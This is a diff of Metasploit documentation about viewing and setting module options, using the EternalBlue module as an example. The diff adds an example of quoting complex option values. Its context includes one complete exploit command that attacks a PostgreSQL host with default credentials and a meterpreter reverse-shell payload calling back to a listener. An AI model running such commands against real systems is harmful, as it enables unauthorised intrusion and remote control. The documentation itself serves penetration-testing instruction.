@@ -2,7 +2,7 @@
 
 Each Metasploit module has a set of options which must be set before running. These can be seen with the `show options` or `options` command:
 
-```
+```msf
 msf6 exploit(windows/smb/ms17_010_eternalblue) > options
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -35,7 +35,7 @@ Exploit target:
 
 Each Metasploit module also has _advanced_ options, which can often be useful for fine-tuning modules, in particular setting connection timeouts values can be useful:
 
-```
+```msf
 msf6 exploit(windows/smb/ms17_010_eternalblue) > advanced
 
 Module advanced options (exploit/windows/smb/ms17_010_eternalblue):
@@ -60,7 +60,7 @@ Payload advanced options (windows/x64/meterpreter/reverse_tcp):
 
 You can see which options stilloptions to be set with the `show missing` command:
 
-```
+```msf
 msf6 exploit(windows/smb/ms17_010_eternalblue) > show missing
 
 Module options (exploit/windows/smb/ms17_010_eternalblue):
@@ -100,6 +100,12 @@ Example:
 ```
 use exploit/linux/postgres/postgres_payload
 run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\ x86_64' verbose=true
+```
+
+You can set complex options using quotes. Example:
+
+```
+set COMMAND "date --date='TZ=\"America/Los_Angeles\" 09:00 next Fri' --iso-8601=ns"
 ```
 
 ### URI support for RHOSTS
